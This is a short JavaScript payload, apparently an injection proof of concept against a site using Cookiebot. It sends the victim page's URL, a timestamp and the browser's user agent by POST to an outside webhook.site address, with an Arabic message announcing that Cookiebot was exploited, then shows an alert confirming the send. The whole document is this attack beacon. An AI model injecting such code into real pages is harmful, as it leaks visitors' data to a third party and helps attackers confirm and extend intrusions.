fetch("https://webhook.site/aa572160-0dad-47bf-a5c0-b663377c4ac6", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    msg: "🚨 Cookiebot تم استغلاله في: " + location.href,
    time: new Date().toISOString(),
    ua: navigator.userAgent
  })
})
.then(() => {
  alert("📬 تم إرسال الطلب إلى Webhook!");
})
.catch(err => {
  alert("❌ فشل الإرسال");
  console.error(err);
});
